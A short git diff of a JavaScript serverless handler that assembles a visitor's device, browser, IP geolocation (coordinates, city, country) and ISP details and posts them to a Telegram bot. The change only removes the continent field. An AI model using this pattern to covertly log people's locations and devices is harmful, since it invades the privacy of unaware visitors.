@@ -60,7 +60,7 @@ exports.handler = async (event, context) => {
         message += `\n${parser.os.name} ${parser.os.version} ${parser.cpu.architecture}`;
         message += `\n\n<b>Browser</b>\n${parser.browser.name} <code>${parser.browser.version}</code> <code>${userAgent.data().headers['sec-ch-ua-full-version-list']}</code>\n\n__________________\n\n`;
 
-        message += `<b>Location</b>\n<a href="https://www.google.com/maps/search/?api=1&query=${xml.lat},${xml.lon}">${xml.city}, ${xml.regionName}, ${xml.country}, ${xml.continent}</a>`;
+        message += `<b>Location</b>\n<a href="https://www.google.com/maps/search/?api=1&query=${xml.lat},${xml.lon}">${xml.city}, ${xml.regionName}, ${xml.country}</a>`;
         message += `\n\n<b>ISP</b>\n${xml.isp}\n${xml.org}`;
 
         await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
